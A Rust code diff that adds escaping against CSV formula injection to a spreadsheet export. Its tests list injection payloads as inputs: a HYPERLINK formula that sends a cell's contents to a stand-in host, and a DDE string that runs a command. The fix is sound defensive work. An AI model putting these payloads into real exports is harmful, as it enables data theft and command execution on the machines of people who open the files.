@@ -557,16 +557,26 @@ fn totals_xml(t: &Totals, indent: &str) -> String {
     out
 }
 
+/// One spreadsheet cell, written so a spreadsheet reads it as the text or
+/// number it is: quoted when it holds a comma, a quote or a line break, and
+/// with a `'` in front when it starts the way a formula does (`=`, `+`, `-`,
+/// `@`, a tab or a carriage return) and is not simply a number. A markup's
+/// subject, label or comment is whatever somebody typed; `=HYPERLINK(...)`
+/// opened in Excel by an estimator is that somebody's formula running there.
+pub fn csv_cell(text: &str) -> String {
+    let formula = text.starts_with(['=', '+', '-', '@', '\t', '\r']) && text.trim().parse::<f64>().is_err(); // WHAT: starts like a formula and is not a plain number. WHY: `-12.5` stays a number; `-1+cmd|...` does not.
+    let text = if formula { format!("'{text}") } else { text.to_string() }; // WHAT: a quote mark in front. WHY: a spreadsheet then reads it as text.
+    if text.contains([',', '"', '\n', '\r']) {
+        format!("\"{}\"", text.replace('"', "\"\"")) // WHAT: quoted, quotes doubled. WHY: one cell, whatever is in it.
+    } else {
+        text // WHAT: as it is. WHY: nothing in it needs quoting.
+    }
+}
+
 fn csv_line(cells: &[String]) -> String {
     let mut out = cells
         .iter()
-        .map(|c| {
-            if c.contains([',', '"', '\n', '\r']) {
-                format!("\"{}\"", c.replace('"', "\"\""))
-            } else {
-                c.clone()
-            }
-        })
+        .map(|c| csv_cell(c)) // WHAT: each cell written safely. WHY: see `csv_cell`.
         .collect::<Vec<_>>()
         .join(",");
     out.push('\n');
@@ -691,6 +701,23 @@ mod tests {
         let csv = listing(&rows, GroupBy::Subject).to_csv();
         assert!(csv.contains("\"Beam, \"\"typ\"\"\""), "{csv}");
         assert!(csv.contains("TOTAL"), "{csv}");
+    }
+
+    #[test]
+    fn a_cell_a_spreadsheet_would_run_is_written_as_text() {
+        for (typed, written) in [
+            ("=HYPERLINK(\"http://x.test/\"&A1)", "\"'=HYPERLINK(\"\"http://x.test/\"\"&A1)\""),
+            ("+cmd|' /c calc'!A0", "'+cmd|' /c calc'!A0"),
+            ("-1+1", "'-1+1"),
+            ("@SUM(A1:A9)", "'@SUM(A1:A9)"),
+            ("\t=1", "'\t=1"),
+        ] {
+            assert_eq!(csv_cell(typed), written, "{typed:?}"); // WHAT: a formula written as text. WHY: before, a markup's comment ran as a formula in the estimator's spreadsheet.
+        }
+        assert_eq!(csv_cell("-12.5"), "-12.5", "a negative number stays a number");
+        assert_eq!(csv_cell("W12x26"), "W12x26", "an ordinary cell is left alone");
+        let rows = vec![beam("=1+1", 0, 20.0, "26", true)]; // WHAT: a subject somebody typed as a formula. WHY: what a takeoff listing writes out.
+        assert!(listing(&rows, GroupBy::Subject).to_csv().contains("'=1+1"), "the listing's CSV writes it as text");
     }
 
     #[test]
